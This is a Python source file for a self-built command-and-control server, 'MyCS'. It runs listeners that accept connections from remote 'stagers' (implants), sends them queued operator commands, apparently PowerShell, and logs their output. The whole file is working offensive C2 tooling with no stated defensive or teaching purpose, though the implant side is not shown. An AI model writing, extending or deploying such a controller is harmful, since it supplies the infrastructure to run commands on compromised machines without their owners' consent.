import socket
import struct
import threading
import queue
import uuid 

class myconstant():
    def __init__(self):

        self.TAG_MYCS = "[MYCS]"
        self.TAG_LISTENER = "[Listener]"
        self.TAG_STAGER = "[Stager]"
        self.TAG_INTE_STAGER = "[Interact]"

        self.CMD_USELISTENER = "uselistener"
        self.CMD_USESTAGER = "userstager"
        self.CMD_INTERACTSTAGER = "interactstager"
        self.CMD_HELP = "help"
        self.CMD_EXIT = "exit"

        self.CMD_BACK = "back"
        self.CMD_LISTENER_GETINFO = "getinfo"
        self.CMD_LISTENER_SETHOSTNAME = "sethost"
        self.CMD_LISTENER_SETPORT = "setport"
        self.CMD_LISTENER_START = "start"
        self.CMD_LISTENER_LIST = "list"
        self.CMD_LISTENER_STOP = "stop"

        self.CMD_STAGER_GET_LIST = "list"
        self.CMD_STAGER_GET_RUNNING_LIST = "rlist"
        self.CMD_STAGER_GET_INTO = "into"
        self.CMD_STAGER_GET_HISTORY = "history"
        self.CMD_STAGER_GET_UNSEEN_HISTORY = "uhistory"


class myconstant_networking():
    def __init__(self):
        self.PSRUN_SUCCESS = "PSRUN_SUCCESS"


# socket is assume connected
class mysocket_handler():
    def __init__(self,in_socket):
        self.__mysocket = in_socket
        self.__msg_buf = ""
        
        self.__msg_tag_st = "[MYMSST]"
        self.__msg_tag_ed = "[MYMSED]"
        #less likely need this
        self.__enc_tag_st = "[MYENST]"
        self.__enc_tag_ed = "[MYENED]"


    def get_nextmsg(self):

        try_get = True
        while try_get:
            # if msg buf is enough
            if self.__msg_tag_st in self.__msg_buf and self.__msg_tag_ed in self.__msg_buf:
                #get start tag
                t_startmsg = self.__msg_buf.find(self.__msg_tag_st)
                t_endmsg = self.__msg_buf.find(self.__msg_tag_ed)
                # msg is from startmsg + len(tag) to endmsg
                r_msg = self.__msg_buf[(t_startmsg + len(self.__msg_tag_st)):t_endmsg]
                print("[DEBUG] r_msg: {}".format(r_msg))
                # remove sub string from buf + return
                self.__msg_buf = self.__msg_buf[(t_endmsg + len(self.__msg_tag_ed)):]
                return r_msg
            else:
                # get more message
                t_indata = self.__mysocket.recv(1024)
                self.__msg_buf = self.__msg_buf + t_indata.decode("ascii", "ignore")



class myserver():

    def __init__(self):
        self.__mysocket_list = dict()
        self.__mydata_list = dict()
        self.__myaddr_list = dict()
        self.__mymsg_list = dict()
        self.__myuuid_list = list()
        self.__mystart_list = dict() #bool

        self.__mylistener_start_list = dict() #bool
        self.__mylistener_hostname_list = dict()
        self.__mylistener_port_list = dict()
        self.__mylistener_socket_list = dict()
        self.__mylistener_uuid_list = list()

        self.__hostname = "127.0.0.1"
        self.__port = 4444


    def start_worker(self,myuuid):
        t_net_constant = myconstant_networking()
        print("[Stager] This is the worker for myuuid: {}".format(myuuid))
        while True:
            # This will be the main runner
            item_que = self.__mydata_list[myuuid]
            mysocket = self.__mysocket_list[myuuid]
            myhistory = self.__mymsg_list[myuuid]
            # make a handler class
            t_mysockethandler = mysocket_handler(mysocket)

            try:
                cmd_struct_to_send = item_que.get(block=True, timeout=5)
            except queue.Empty:
                #print("[DEBUG] Job Que for {} is empty".format(myuuid))
                continue
            
            try:
                myhistory.append("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
                encode_tag = cmd_struct_to_send[0].encode("ascii", "ignore")
                send_result = mysocket.send(encode_tag)
                myhistory.append("[Stager] Total of number to send: {}, Sent: {}".format(len(encode_tag), send_result))
                recv_result = t_mysockethandler.get_nextmsg()
                myhistory.append("[Stager] Send command_tag result: {}".format(recv_result))

                encode_cmd = cmd_struct_to_send[1].encode("ascii", "ignore")
                send_result = mysocket.send(encode_cmd)
                myhistory.append("[Stager] Total of number to send: {}, Sent: {}".format(len(encode_cmd), send_result))
                recv_result = t_mysockethandler.get_nextmsg()
                myhistory.append("[Stager] Send command result: {}".format(recv_result))

                # try get cmd result if any
                recv_result = t_mysockethandler.get_nextmsg()
                myhistory.append("[Stager] Run Command result: {}".format(recv_result))
                # ack for success
                encode_cmd = t_net_constant.PSRUN_SUCCESS.encode("ascii", "ignore")
                send_result = mysocket.send(encode_cmd)
                myhistory.append("[DEBUG] PSRUN_SUCCESS sent")
                myhistory.append("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")

            except Exception as e:
                myhistory.append("Exception: " + str(e))
                mysocket.shutdown(socket.SHUT_RDWR)
                mysocket.close()
                #remove from worker list
                self.__mydata_list.pop(myuuid, None)
                self.__mysocket_list.pop(myuuid, None)
                self.__myaddr_list.pop(myuuid, None)
                myhistory.append("[Stager] {} is stoped ...".format(myuuid))
                myhistory.append("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
                break


    def start_listener(self):
        print("Starting listener on Hostname: {} and Port: {}".format(self.__hostname,self.__port))
        #get uuid
        listeneruuid = uuid.uuid4().hex[:6].upper()
        self.__mylistener_start_list[listeneruuid] = True
        self.__mylistener_hostname_list[listeneruuid] = self.__hostname
        self.__mylistener_port_list[listeneruuid] = self.__port
        self.__mylistener_uuid_list.append(listeneruuid)

        self.__mylistener_socket_list[listeneruuid] = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.__mylistener_socket_list[listeneruuid].bind((self.__hostname, self.__port))
        self.__mylistener_socket_list[listeneruuid].settimeout(5)
        self.__mylistener_socket_list[listeneruuid].listen()
        
        while self.__mylistener_start_list[listeneruuid]:
            try:
                #print("[DEBUG] Waiting for new connection ...")
                conn, addr = self.__mylistener_socket_list[listeneruuid].accept()
                print("[Listener] Connected by", addr)
                #get uuid
                myuuid = uuid.uuid4().hex[:6].upper()
                #push socket into dict
                self.__mysocket_list[myuuid] = conn
                #push addr into dict
                self.__myaddr_list[myuuid] = addr
                #create fifo
                self.__mydata_list[myuuid] = queue.Queue()
                #create history
                self.__mymsg_list[myuuid] = list()
                #push uuid
                self.__myuuid_list.append(myuuid)
                #set start
                self.__mystart_list[myuuid] = True
                print("[Listener] myuuid is {}".format(myuuid))
                threading.Thread(target=self.start_worker,args=(myuuid,)).start()
                
            except socket.timeout:
                pass
        
        # our of while loop
        self.__mylistener_socket_list[listeneruuid].close()
        self.__mylistener_start_list.pop(listeneruuid, None)
        self.__mylistener_hostname_list.pop(listeneruuid, None)
        self.__mylistener_port_list.pop(listeneruuid, None)
        self.__mylistener_socket_list.pop(listeneruuid, None)
        self.__mylistener_uuid_list.remove(listeneruuid)
        print("[Listener] {} is stoped ...".format(listeneruuid))


    def create_command(self,stager,tag,command):
        self.__mydata_list[stager].put([tag,command])
    
    def stop_listener(self,listener):
        self.__mylistener_start_list[listener] = False

    def print_info(self):
        print("======Listener Info=========")
        print("Listener Type: socket")
        print("Hostname: {}".format(self.__hostname))
        print("Port Number: {}".format(self.__port))
    
    def print_stager(self):
        print("List of avaliable stager: {}".format(self.__myuuid_list))
    
    def print_listener(self):
        print("List of avaliable listener: {}".format(self.__mylistener_uuid_list))

    def get_stager(self):
        return self.__myuuid_list
    def get_listener(self):
        return self.__mylistener_uuid_list

    def print_stager_running(self):
        return [a for a in self.__myuuid_list if self.__mystart_list[a]]

    def get_history(self):
        return self.__mymsg_list

    def set_hostname(self,hostname):
        assert(type(hostname) is str)
        self.__hostname = hostname

    def set_portnumber(self,port):
        assert(type(port) is int)
        self.__port = port


class mymainclass():

    def __init__(self):
        self.__t_myconstant = myconstant()
        self.__t_myserver = myserver()

    def __cmd_list_main(self):
        print("\n+++++++++++++++++++++++++++++++++++")
        print(self.__t_myconstant.CMD_USELISTENER + ": Go to listener settings")
        #print(self.__t_myconstant.CMD_USESTAGER + ": Go to stager setting")
        print(self.__t_myconstant.CMD_INTERACTSTAGER + ": Interact with live stager")
        print(self.__t_myconstant.CMD_HELP + ": Print cmd list and help message")
        print(self.__t_myconstant.CMD_EXIT + ": Exit the app")
        print("+++++++++++++++++++++++++++++++++++\n")

    def __cmd_list_listener(self):
        print("\n+++++++++++++++++++++++++++++++++++")
        print(self.__t_myconstant.CMD_LISTENER_GETINFO + ": Print info of current listener setting")
        print(self.__t_myconstant.CMD_LISTENER_SETHOSTNAME + ": Set hostname")
        print(self.__t_myconstant.CMD_LISTENER_SETPORT + ": Set port number")
        print(self.__t_myconstant.CMD_LISTENER_LIST + ": Get a list of running listener")
        print(self.__t_myconstant.CMD_LISTENER_START + ": Start Listener using info")
        print(self.__t_myconstant.CMD_LISTENER_STOP + ": Stop a listener")
        print(self.__t_myconstant.CMD_HELP + ": Print cmd list and help message")
        print(self.__t_myconstant.CMD_BACK + ": Go back to main menu")
        print("+++++++++++++++++++++++++++++++++++\n")

    def __cmd_list_stager(self):
        print("\n+++++++++++++++++++++++++++++++++++")
        print(self.__t_myconstant.CMD_STAGER_GET_RUNNING_LIST + ": Get a list of running stager")
        print(self.__t_myconstant.CMD_STAGER_GET_LIST + ": Get full list of stager")
        print(self.__t_myconstant.CMD_STAGER_GET_HISTORY + ": Get history of stager message")
        print(self.__t_myconstant.CMD_STAGER_GET_INTO + ": Send cmd to stager")
        print("+++++++++++++++++++++++++++++++++++\n")


    def main(self):
        
        #init
        cmd_tag = self.__t_myconstant.TAG_MYCS

        print("Hello To MyCS ...")
        
        self.__cmd_list_main()
        

        to_exit = False
        while (not to_exit):
            user_input = input(cmd_tag + "> ")
            command_id = user_input
            
            if cmd_tag == self.__t_myconstant.TAG_MYCS: #Main menu
                
                # menu switch
                if command_id == self.__t_myconstant.CMD_USELISTENER:
                    cmd_tag = self.__t_myconstant.TAG_LISTENER
                    continue

                if command_id == self.__t_myconstant.CMD_USESTAGER:
                    cmd_tag = self.__t_myconstant.TAG_STAGER
                    continue
                
                if command_id == self.__t_myconstant.CMD_INTERACTSTAGER:
                    cmd_tag = self.__t_myconstant.TAG_INTE_STAGER
                    continue
                
                # main menu
                if command_id == self.__t_myconstant.CMD_EXIT:
                    print("Thanks for using MyCS..")
                    exit()
                
                if command_id == self.__t_myconstant.CMD_HELP:
                    self.__cmd_list_main()
                    continue
            
            if cmd_tag == self.__t_myconstant.TAG_LISTENER: # Listener menu

                # menu switch
                if command_id == self.__t_myconstant.CMD_BACK:
                    cmd_tag = self.__t_myconstant.TAG_MYCS
                    continue
                
                # listener menu
                if command_id == self.__t_myconstant.CMD_HELP:
                    self.__cmd_list_listener()
                    continue

                if command_id == self.__t_myconstant.CMD_LISTENER_GETINFO:
                    self.__t_myserver.print_info()
                    continue

                if command_id == self.__t_myconstant.CMD_LISTENER_SETHOSTNAME:
                    user_input = input("Please enter the hostname to listen on: ")
                    self.__t_myserver.set_hostname(user_input)
                    continue

                if command_id == self.__t_myconstant.CMD_LISTENER_SETPORT:
                    user_input = input("Please enter the port number to listen on: ")
                    self.__t_myserver.set_portnumber(int(user_input))
                    continue

                if command_id == self.__t_myconstant.CMD_LISTENER_LIST:
                    self.__t_myserver.print_listener()
                
                if command_id == self.__t_myconstant.CMD_LISTENER_START:
                    threading.Thread(target=self.__t_myserver.start_listener).start()
                    continue
                
                if command_id == self.__t_myconstant.CMD_LISTENER_STOP:
                    user_input_listener = input("Please enter the listener uuid: ")
                    if user_input_listener not in self.__t_myserver.get_listener():
                        print("Please input a valid listener uuid")
                        continue
                    self.__t_myserver.stop_listener(user_input_listener)
                    continue
            
            if cmd_tag == self.__t_myconstant.TAG_INTE_STAGER:

                # menu switch
                if command_id == self.__t_myconstant.CMD_BACK:
                    cmd_tag = self.__t_myconstant.TAG_MYCS
                    continue
                
                if command_id == self.__t_myconstant.CMD_HELP:
                    self.__cmd_list_stager()
                    continue

                # stager inte menu
                if command_id == self.__t_myconstant.CMD_STAGER_GET_LIST:
                    self.__t_myserver.print_stager()
                    continue
                
                if command_id == self.__t_myconstant.CMD_STAGER_GET_RUNNING_LIST:
                    self.__t_myserver.print_stager_running()
                    continue

                if command_id == self.__t_myconstant.CMD_STAGER_GET_HISTORY:
                    user_input_stager = input("Please enter the stager uuid: ")
                    if user_input_stager not in self.__t_myserver.get_stager():
                        print("Please input a valid stager uuid")
                        continue
                    for each_msg in self.__t_myserver.get_history()[user_input_stager]:
                        print(each_msg)
                    continue

                if command_id == self.__t_myconstant.CMD_STAGER_GET_INTO:
                    user_input_stager = input("Please enter the stager uuid: ")
                    if user_input_stager not in self.__t_myserver.get_stager():
                        print("Please input a valid stager uuid")
                        continue
                    user_input_command_tag = input("Please enter the command tag: ")
                    user_input_command = input("Please enter the command: ")
                    self.__t_myserver.create_command(user_input_stager,user_input_command_tag,user_input_command)
                    continue
                


if __name__ == "__main__":
    t_mymainclass = mymainclass()
    t_mymainclass.main()


